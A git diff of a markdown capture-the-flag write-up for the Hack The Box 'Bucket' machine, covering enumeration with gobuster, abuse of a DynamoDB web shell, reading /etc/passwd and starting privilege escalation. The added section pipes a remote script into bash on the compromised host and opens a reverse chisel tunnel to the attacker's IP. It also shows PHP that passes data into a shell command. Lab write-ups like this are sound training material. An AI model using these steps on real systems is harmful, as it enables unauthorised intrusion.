@@ -132,17 +132,6 @@ http://s3.bucket.htb/adserver/images/
 Though I can't seem to get to this website (via `ping` nor browser).
 
 
-
-
-
-
-
-
-
-
-
-
-
 After a bit of searching, I found a tool to check what subdomains there might be with a given site.  This tool is called `gobuster`.  
 
 I first tried it with the initial site:
@@ -198,38 +187,6 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 ===============================================================
 2021/03/06 21:11:16 Starting gobuster
 ===============================================================
-[ERROR] 2021/03/06 21:11:27 [!] Get http://s3.bucket.htb/!: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
-[ERROR] 2021/03/06 21:11:27 [!] Get http://s3.bucket.htb/00-inc: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
-[ERROR] 2021/03/06 21:11:27 [!] Get http://s3.bucket.htb/00-cache: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
-[ERROR] 2021/03/06 21:11:27 [!] Get http://s3.bucket.htb/!_images: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
-[ERROR] 2021/03/06 21:11:27 [!] Get http://s3.bucket.htb/!ut: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
-[ERROR] 2021/03/06 21:11:27 [!] Get http://s3.bucket.htb/00-mp: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
-[ERROR] 2021/03/06 21:11:27 [!] Get http://s3.bucket.htb/00-ps: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
-[ERROR] 2021/03/06 21:11:27 [!] Get http://s3.bucket.htb/007: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
-[ERROR] 2021/03/06 21:11:27 [!] Get http://s3.bucket.htb/007007: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
-[ERROR] 2021/03/06 21:11:27 [!] Get http://s3.bucket.htb/01: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
-[ERROR] 2021/03/06 21:11:27 [!] Get http://s3.bucket.htb/02: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
-[ERROR] 2021/03/06 21:11:27 [!] Get http://s3.bucket.htb/0246: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
-[ERROR] 2021/03/06 21:11:27 [!] Get http://s3.bucket.htb/.listing: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
-[ERROR] 2021/03/06 21:11:27 [!] Get http://s3.bucket.htb/!backup: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
-[ERROR] 2021/03/06 21:11:27 [!] Get http://s3.bucket.htb/!images: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
-[ERROR] 2021/03/06 21:11:27 [!] Get http://s3.bucket.htb/!res: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
-[ERROR] 2021/03/06 21:11:27 [!] Get http://s3.bucket.htb/!textove_diskuse: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
-[ERROR] 2021/03/06 21:11:27 [!] Get http://s3.bucket.htb/.htpasswd: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
-[ERROR] 2021/03/06 21:11:27 [!] Get http://s3.bucket.htb/.bash_history: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
-[ERROR] 2021/03/06 21:11:27 [!] Get http://s3.bucket.htb/.bashrc: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
-[ERROR] 2021/03/06 21:11:27 [!] Get http://s3.bucket.htb/.cvs: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
-[ERROR] 2021/03/06 21:11:27 [!] Get http://s3.bucket.htb/.forward: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
-[ERROR] 2021/03/06 21:11:27 [!] Get http://s3.bucket.htb/.history: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
-[ERROR] 2021/03/06 21:11:27 [!] Get http://s3.bucket.htb/.htaccess: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
-[ERROR] 2021/03/06 21:11:27 [!] Get http://s3.bucket.htb/.subversion: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
-[ERROR] 2021/03/06 21:11:27 [!] Get http://s3.bucket.htb/.svn: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
-[ERROR] 2021/03/06 21:11:27 [!] Get http://s3.bucket.htb/.passwd: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
-[ERROR] 2021/03/06 21:11:27 [!] Get http://s3.bucket.htb/.perf: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
-[ERROR] 2021/03/06 21:11:27 [!] Get http://s3.bucket.htb/.profile: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
-[ERROR] 2021/03/06 21:11:27 [!] Get http://s3.bucket.htb/.rhosts: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
-[ERROR] 2021/03/06 21:11:27 [!] Get http://s3.bucket.htb/.ssh: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
-[ERROR] 2021/03/06 21:11:27 [!] Get http://s3.bucket.htb/03: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
 http://s3.bucket.htb/health (Status: 200)
 http://s3.bucket.htb/server-status (Status: 403)
 http://s3.bucket.htb/shell (Status: 200)
@@ -247,7 +204,7 @@ This is obvious that this site is running an AWS server, as `s3` (and DynamoDB, 
 
 Going to `shell`, we get redirected to `http://444af250749d:4566/shell/`, which then does not load.  After some playing around, it is important to have the forward slash at the end of the URL: `http://s3.bucket.htb/shell/`, which does *not* cause a reditect.  It takes us to a page that is a DynamoDB Web Shell, which uses JavaScript.
 
-I search "AWS S3 DynamoDB" and find a lot of information on "S3 Buckets", etc.  The web shell looks like it has its own API.  I found [this](https://rhinosecuritylabs.com/penetration-testing/penetration-testing-aws-storage/) online.  To test this exploit, I need the [AWS CLI](https://docs.aws.amazon.com/cli/latest/userguide/cli-chap-welcome.html) (`sudo apt install awscli`).
+I search "AWS S3 DynamoDB" and find a lot of information on "S3 Buckets", etc.  The web shell looks like it has its own API.  I found [this](https://rhinosecuritylabs.com/penetration-testing/penetration-testing-aws-storage/) online.  To test this exploit, I need the [AWS CLI](https://docs.aws.amazon.com/cli/latest/userguide/cli-chap-welcome.html) (`sudo apt install awscli`; `brew install awscli`).
 
 To use the AWS CLI, we need to [configure ourselves](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/configure/index.html).  Then we can enumerate the DynamoDB enpoints.  We can use a made-up access key here.
 
@@ -414,32 +371,7 @@ Of course, Roy's password is encrypted:
 cat /etc/passwd
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-bin:x:2:2:bin:/bin:/usr/sbin/nologin
-sys:x:3:3:sys:/dev:/usr/sbin/nologin
-sync:x:4:65534:sync:/bin:/bin/sync
-games:x:5:60:games:/usr/games:/usr/sbin/nologin
-man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
-lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
-mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
-news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
-uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
-proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
-www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
-backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
-list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
-irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
-gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
-nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
-systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
-systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
-systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
-messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
-syslog:x:104:110::/home/syslog:/usr/sbin/nologin
-_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
-tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
-uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
-tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
-landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
+...
 pollinate:x:110:1::/var/cache/pollinate:/bin/false
 sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
 systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
@@ -484,4 +416,72 @@ Error: GDBus.Error:org.freedesktop.DBus.Error.ServiceUnknown: The name com.ubunt
 
 No luck.  After being naïve, I recall that this hack worked because we had an `ssh` port open.  We do have this port open here, though this doesn't seem to work.  No worries.  
 
-We note that Roy doesn't actually have an `.ssh` directory in his `home`.  So perhaps `ssh` is not the vulnerability here?
+We note that Roy doesn't actually have an `.ssh` directory in his `home`.  So perhaps `ssh` is not the vulnerability here.
+
+<!--- find . -type f -group roy -exec grep -i 'passwd' {} \; --->
+
+Looking for some solutions online, I find that one way to escelate privileges is to potentially see if the machine has any servers running:
+```bash
+roy@bucket:~/project$ netstat -tulpn | grep "LISTEN"
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+tcp        0      0 127.0.0.1:42513         0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:4566          0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -
+tcp6       0      0 :::80                   :::*                    LISTEN      -
+tcp6       0      0 :::22                   :::*                    LISTEN      -
+```
+
+Interesting that they have a local server running on port `8000`!  `curl`ing it displays a lot of HTML.  A brief look through this shows that it seems to use code similar to the `index.php` code in `/var/www/html` (where we started).  I go into `/var/www/` and see that there is another directory called `bucket-application`.  I display the first little bit of `index.php` from this directory:
+```php
+roy@bucket:/var/www/bucket-app$ head -n 30 index.php
+head -n 30 index.php
+<?php
+require 'vendor/autoload.php';
+use Aws\DynamoDb\DynamoDbClient;
+if($_SERVER["REQUEST_METHOD"]==="POST") {
+	if($_POST["action"]==="get_alerts") {
+		date_default_timezone_set('America/New_York');
+		$client = new DynamoDbClient([
+			'profile' => 'default',
+			'region'  => 'us-east-1',
+			'version' => 'latest',
+			'endpoint' => 'http://localhost:4566'
+		]);
+
+		$iterator = $client->getIterator('Scan', array(
+			'TableName' => 'alerts',
+			'FilterExpression' => "title = :title",
+			'ExpressionAttributeValues' => array(":title"=>array("S"=>"Ransomware")),
+		));
+
+		foreach ($iterator as $item) {
+			$name=rand(1,10000).'.html';
+			file_put_contents('files/'.$name,$item["data"]);
+		}
+		passthru("java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/$name 800 A4 -out files/result.pdf");
+	}
+}
+else
+{
+?>
+```
+
+This is interesting.  The PHP function at the top seems to look for a `POST` request, create a new DynamoDB instance, scan for a table called `alerts` with a search query `Ransomware`, and uses a tool called `Pd4Cmd` (which I looked up, and converts to PDF).
+
+
+
+
+Let's try to portforward it to our machine to take a look.  When looking up how to do this, I found a [fast TCP/UDP tunnel over HTTP tool](https://github.com/jpillora/chisel).  On our machine, we can run
+```bash
+chisel server -p 10000 --reverse
+```
+
+You must do this while connected to the machine from the netcat listener.  And on the host machine now run
+```bash
+cd /tmp
+curl https://i.jpillora.com/chisel! | bash
+./chisel client 10.10.14.239 R:8000:127.0.0.1:8000
+```
